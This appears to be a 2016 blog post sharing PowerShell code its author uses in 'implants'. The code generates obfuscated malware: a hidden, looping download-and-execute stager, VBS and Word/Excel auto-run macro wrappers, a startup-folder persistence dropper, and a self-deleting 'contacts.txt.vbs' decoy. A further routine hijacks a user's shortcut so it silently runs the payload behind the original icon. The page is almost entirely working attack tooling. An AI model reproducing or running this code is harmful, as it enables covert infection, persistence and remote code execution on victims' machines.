@@ -1,0 +1,449 @@
+<html><head><title>porting gen-obfuscated routines to powershell</title> <style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head> <body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 11pt"><pre><hr>|| porting gen-obfuscated to powershell, author: xor-function || 09/02/2016 || <a style="text-decoration: none" href="../"><span style="text-decoration: none">Back to main</span></a><hr></pre><pre>
+
+gen-obfuscated works well in a Linux environment due to Perl usually being avaliable by default.
+Since Perl is not normally available on Windows, I decided to port some code to Powershell.
+
+This started originally as the shortcut-inject function but now I've have been expanding it's 
+ability. This is what I got so far, I have already added this code to my async-http/https and 
+tcp Powershell implants.
+
+--------------------------------------===[ BOC ]===----------------------------------------------------
+
+#[->] function for variable name randomization
+function rand-str {
+
+	$rint = get-random -max 10 -min 3
+	$charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
+	1..$rint | % { $rchr += $charArray | get-random }
+	$randstr = [string]::join("", ($rchr))
+
+	return $randstr
+}
+
+#[->] made function internal for portability
+function gen-enccmd {
+
+	param($clrcmd)
+	$bytescmd = [System.Text.Encoding]::Unicode.GetBytes($clrcmd.ToString())
+	$enccmd = [Convert]::ToBase64String($bytescmd)
+
+	return $enccmd
+}
+
+#[->] will return array of network drives
+function get-shares {
+
+	$shares = $( gwmi win32_mappedlogicalDisk )
+	$Drives = $shares.Name
+
+	return $Drives 
+}
+
+#[->] will return array of drives on local system
+function get-Drives { 
+
+	$raw = gdr -PSProvider 'Filesystem' | where { $_.Free } | sort-object -Descending
+	$drives = $($raw.Root)
+
+	return $drives
+}
+
+function get-localDrives { 
+
+	$ldrives = gwmi -query "SELECT * from win32_logicaldisk where DriveType = '3'"
+
+	return $ldrives
+}
+
+
+#[->] Dev In-Process...
+function get-usbDrives {
+ 
+	$devices = gwmi win32_diskdrive | ?{$_.interfacetype -eq "USB"} | %{gwmi -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID=`"$($_.DeviceID.replace('\','\\'))`"} WHERE AssocClass = Win32_DiskDriveToDiskPartition"} |  %{gwmi -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID=`"$($_.DeviceID)`"} WHERE AssocClass = Win32_LogicalDiskToPartition"} | %{$_.deviceid}
+
+	return $devices
+}
+
+#[->] Kicks off a looping powershell command string 
+function persistent-stager($scriptUrl) {
+
+	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
+        {
+
+		#[->] prep command download string to be passed to obfuscation engine
+		$cmds = 'while(1){try{ powershell -w hidden -c '
+		$cmds += '"&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};'
+		$cmds += 'iex(New-Object System.Net.Webclient).DownloadString(''' + $scriptUrl + ''')}" }'
+		$cmds += 'catch{ Start-Sleep -s 10}Start-Sleep -s 5 }'
+		$encCmdString = gen-enccmd $cmds
+		$cmdstring = 'cmd /q /c powershell.exe -w hidden -enc ' + $encCmdString
+	
+		return $cmdstring
+
+         } else {
+
+                 write-output "[!] FAilED!`n[!]You need to use a proper URL"
+                 write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
+         }
+
+}
+
+#[->] sit on a file in use, to see if it's closed
+function wait-Filewrite($file) {
+
+        #[->] wait to see if you can write to file
+	$tries = 0
+	while ($tries -lt 60 ) {      
+               try {
+                       	$docPath = $($doc.FullName)
+                       	$file = Get-Item $docPath
+        		$fh0 = $file.OpenWrite()
+                        $tries++
+                        $fh0.Close()
+             	} catch {
+	              #[->] insert some debug code here
+		}
+	}
+	if ($tries -eq 60 ) { return 'fail' } else { return 'pass' }
+
+} 
+
+# [->] vbs code generator, the obfuscation engine core algo
+function obfuscate-cmdstring($cmdstring, $sType, $vbaType) {
+
+	$newline = "`r`n"
+	
+    	#[->] Obfuscate command string for wscript shell
+    	$cmdstrArray = @()
+    	[int]$ccnt = '1'
+	$cmdfile = $newline	
+	
+    	foreach ( $char in $cmdstring.GetEnumerator() ) 
+	{
+		
+		#[->] translate to ascii value then do math ops on it
+        	$val = [Byte][Char]$char
+        	$rnum = get-random -max 9 -min 1
+        	$nval = [int]$val - [int]$rnum
+        	$hval = [int]$nval / '2'
+		
+		if ( [int]$ccnt -eq '1' )
+		{
+
+			#[->] genrate random variable name then append it to array
+			$rvarstr = rand-str
+			$rvarstr += rand-str
+			$cmdstrArray += $rvarstr
+			$cmdfile += $rvarstr + ' =' + ' chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
+			
+		} else {
+		
+			$cmdfile += ' &chr(' + $hval + '+' + $hval + '+' + $rnum + ')'
+		
+		}
+		
+		#[->] create random legnth of char use
+		$randval = get-random -max 12 -min 1
+        	if ( $randval -eq '8' ) { $cmdfile += $newline; [int]$ccnt = 0 }
+       		$ccnt++	
+
+	}
+	
+    	#[->] concatinate vars to single command string
+
+    	[int]$cnt = 1
+    	foreach ( $randvar in $cmdstrArray )
+	{
+		
+		if ( $cnt -eq '1' )
+        	{
+        		$mainRvar = rand-str
+        		$cmdfile += $newline
+            		$cmdfile += $mainRvar + ' = ' + $randvar
+
+        	} else { $cmdfile += ' + ' + $randvar }
+       		$cnt++
+
+	}
+
+	
+	if ( $sType -eq 'vbs' ) 
+	{
+
+        	#[->] set variables for template generation
+        	$vbsCode = $newline
+
+        	#[->] initialize first function in vbs script
+        	$randfunc = rand-str
+        	$vbsCode += 'Function ' + $randfunc + '() ' + $newline
+
+        	#[->] Insert obfuscated command string.
+        	$vbsCode += $cmdfile
+
+        	#[->] initalize file system object
+        	$fso = rand-str
+        	$vbsCode += $newline
+        	$vbsCode += 'set ' + $fso + ' = ' + 'createObject("wscript.shell")' + $newline
+        	$vbsCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
+        	$vbsCode += 'End Function' + $newline
+        	$vbsCode += $randfunc
+			
+        	#[->] vbs script in "vbsCode" is ready to be written to disk
+
+		return $vbsCode
+		
+	}
+
+	if ( $sType -eq 'vba' ) 
+	{
+
+		#[->] set variables for template generation
+        	$newline = "`r`n"
+        	$vbaCode = $newline
+
+        	#[->] initialize first function in vbs script
+        	$randfunc = rand-str
+        	$vbaCode += 'Sub ' + $randfunc + '() ' + $newline
+
+		#[->] Insert obfuscated command string.
+        	$vbaCode += $cmdfile
+
+		#[->] initalize file system object
+        	$fso = rand-str
+        	$vbaCode += $newline
+		$vbaCode += 'set ' + $fso + ' = ' + 'createObject("wscript.shell")' + $newline
+        	$vbaCode += $fso + '.run ' + $mainRvar + ',' + ' 0, ' + 'false' + $newline
+        	$vbaCode += 'End Sub' + $newline
+
+      		#[->] Set different syntax based upon macro type word vs execl
+        	if ( $vbaType -eq "word" ) { $vbaCode += "Sub AutoOpen(): " + $randfunc + ": End Sub" }
+        	if ( $vbaType -eq "excel" ) { $vbaCode += "Sub Workbook_Open(): " + $randfunc + ": End Sub" }
+
+		#[->] vba script is ready
+
+        	return $vbaCode
+
+    	}
+
+} # end obfuscate-cmdstring
+
+function simple-persistence($scriptUrl) {
+
+	if ($scriptUrl) 
+	{ 
+	
+		if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
+		{ 
+		
+			#[->] insure cmd string is working or not before intensive debugging
+			$cmdstring = persistent-stager $scriptUrl
+		
+			#[->] create vbs script then change attribute to hidden
+			$saveDir = $env:appdata + '\Microsoft\Windows\start menu\programs\Startup\'
+			
+			#[->] insure cmd string is working or not before intensive debugging
+			$vbsCode = obfuscate-cmdstring $cmdstring 'vbs'
+			$rand = rand-str; $vbsName = $rand + '.vbs'
+			$vbspath = $saveDir + $vbsName
+	
+			set-content $vbspath $vbsCode -Encoding ASCII
+			write-output "[+] finished generating obfuscated persistent stager."
+			
+		} else { 
+			
+			write-output "[!] FAilED!`n[!]You need to use a proper URL" 
+			write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script" 
+		}
+		
+	} else { 
+		
+		$usage =  "`n" + '[=>] Ex: RSH => C:\> simple-persistence "https://your-domain.com/ps-script"' + "`n"
+		$usage += '[=>] drops an obfuscated vbs script to the windows startup folder.' + "`n"
+		$usage += '[=>] Insure that the script is self contained and does not need additional parameters' + "`n"
+		$usage += '[=>] for the C2 ip/port etc...' + "`n"
+		
+		write-output $usage
+		
+	}
+
+}
+
+function simple-downloader($scriptUrl) {
+
+        if ($scriptUrl)
+        {
+
+                if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
+                {
+
+                        #[->] insure cmd string is working or not before intensive debugging
+                        $cmdstring = persistent-stager $scriptUrl
+
+                        #[->] create vbs script then change attribute to hidden
+                        $saveDir = $pwd.Path + '\'
+
+                        #[->] insure cmd string is working or not before intensive debugging
+                        $vbsCode = obfuscate-cmdstring $cmdstring 'vbs'
+
+                        $rand = rand-str 
+			$vbsName = 'contacts-' + $rand + '.txt.vbs'
+			$noteName = 'contacts-' + $rand + '.txt'
+			$notePath = $saveDir + $noteName
+                        $vbspath = $saveDir + $vbsName
+
+                        #[->] cmd string to generate txt file 
+                        $NPcmdstring = 'cmd /c echo johndoe@yahoo.com > ' + $notePath + ' && notepad ' + $noteName 
+                        $vbsCode += "`r`n"
+                        $vbsCode += obfuscate-cmdstring $NPcmdstring 'vbs'
+
+                        #[->] get vbs code to self-destruct
+                        $randFso = rand-str
+                        $vbsCode += "`r`n"
+                        $vbsCode += 'set ' +  $randFso + ' = ' + 'CreateObject("Scripting.FileSystemObject")' + "`r`n"
+                        $vbsCode += $randFso + '.DeleteFile Wscript.ScriptFullName'
+
+                        set-content $vbspath $vbsCode -Encoding ASCII
+                        write-output "[+] finished generating obfuscated persistent stager."
+
+                } else { 
+
+                        write-output "[!] FAilED!`n[!]You need to use a proper URL"
+                        write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
+                }
+
+        } else {
+
+                $usage =  "`n" + '[=>] Ex: RSH => C:\> simple-downloader "https://your-domain.com/ps-script"' + "`n"
+                $usage += '[=>] drops an obfuscated vbs script to the current working folder.' + "`n"
+                $usage += '[=>] Insure that the script to be downloaded is self contained and' + "`n"
+		$usage += '[=>] does not need additional parameters for the C2 ip/port etc...' + "`n"
+
+                write-output $usage
+
+        }
+
+}
+ 
+
+function new-macro($scriptUrl, $vbaType) {
+
+	if ($scriptUrl) 
+	{ 
+	
+        	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' )
+	        {
+ 
+			#[->] insure cmd string is working or not before intensive debugging
+			$cmdstring = persistent-stager $scriptUrl
+			$vbaCode = obfuscate-cmdstringr $cmdstring 'vba' $vbaType
+			
+			return $vbaCode
+
+		} else { 
+		
+			write-output "[!] FAilED!`n[!]You need to use a proper URL " 
+			write-output "format ex: http://ex_domain.com/script or https://ex_domain.com/script"
+	
+		}
+	
+	} else {  write-output "[!] FAilED!" }
+
+}
+
+function shortcut-infect($shortcutFullname, $scriptUrl) {
+
+	if ( $scriptUrl -match 'http://' -Or $scriptUrl -match 'https://' ) 
+	{ 
+
+                #[->] suppress error messages, makes debugging less annoying
+                #[->] uncomment the code inside catch for more uniform error msg
+		try { 
+
+			$f = Get-Item $shortcutFullName -erroraction 'silentlycontinue'
+                	$fh = $f.OpenWrite()
+
+		} catch { 
+			
+			$msg = "[!] cannot write to file!"
+			return $msg
+                        #Write-Warning "Something went wrong!"
+                        #Write-Error $_
+
+		}
+
+		if($fh){ $fh.Close() } else { return }
+	
+		write-output "[*] Infecting shortcut...."
+
+		#[->] extracting original properties from selected icon
+		$wsh = New-Object -COM WScript.Shell
+		$targetPath = $wsh.CreateShortcut("$shortcutFullname").TargetPath
+
+		$chklnk = 'C:\\windows\\system32\\cmd.exe /c'
+		if ( $targetPath -match $chklnk ) { $msg = "[!] This lnk is already done"; return $msg } 
+
+		$workingDir = $wsh.CreateShortcut("$shortcutFullname").WorkingDirectory
+	
+		#[->] Get name of binary without full path to use as icon target
+		$targetBinary = (gci $targetPath -force).Name
+
+		#[->] prep command download string to be passed to obfuscation engine
+		$cmdstring = persistent-stager $scriptUrl
+		
+		#[->] Obfuscate first wscript command string
+		$vbsfile = obfuscate-cmdstring $cmdstring 'vbs'
+		
+            	$newline = "`r`n"
+		$vbsfile += $newline
+	
+		#[->] initialize second function 
+		$randfunc2 = rand-str
+		$vbsfile += 'Function ' + $randfunc2 + '() ' + $newline
+		$fso2 = rand-str
+		$vbsfile += 'set ' + $fso2 + ' = ' + 'createObject("wscript.shell")' + $newline
+		$vbsfile += $fso2 + '.run ' +  '"' + 'cmd /c ' + 'start ' + $targetBinary +  '"' + ',' + ' 0, ' + 'false' + $newline
+		$vbsfile += 'End Function' + $newline
+		$vbsfile += $randfunc2
+	
+		#[->] vbs script in "vbsfile" is ready to be written to disk
+		#[->] create vbs script then change attribute to hidden
+		$saveDir = (gci $shortcutFullname).DirectoryName + '\'
+	
+		$rand = rand-str; $vbsName = $rand + '.vbs'
+		$vbspath = $saveDir + $vbsName
+	
+		set-content $vbspath $vbsfile -Encoding ASCII
+		$vbsAtt = get-item $vbspath
+		$vbsAtt.attributes="Hidden"
+	
+		#[->] Delete original shortcut 
+		Remove-Item $shortcutFullname
+	
+		#[->] Modify values acquired from original shortcut 
+		$wsh2 = New-Object -COM WScript.Shell
+		$newSc = $shortcutFullname
+		$newShortcut = $wsh2.CreateShortcut("$newSc")
+		$newShortcut.TargetPath = "c:\windows\system32\cmd.exe"
+		$newShortcut.WorkingDirectory = $workingDir
+
+		#[->] Set shortcut arguments	
+		$args = '/c ' + '"' + $vbspath + '"'
+		$newShortcut.Arguments = "$args"
+		$newIcon = $targetPath + ',0'
+		$newShortcut.IconLocation = "$newIcon"
+		$newShortcut.Save();
+
+		$msg = "[+] finished injecting command string into shortcut."
+		return $msg
+
+	} else { $msg = "[!] FAilED!`n[!]You need to use a proper URL format ex: http://ex_domain.com/script or https://ex_domain.com/script"; return $msg }
+
+}
+
+
+
+-------------------------------------===[ EOC ]===----------------------------------------------------------
+
+
+
+</pre></body></html>
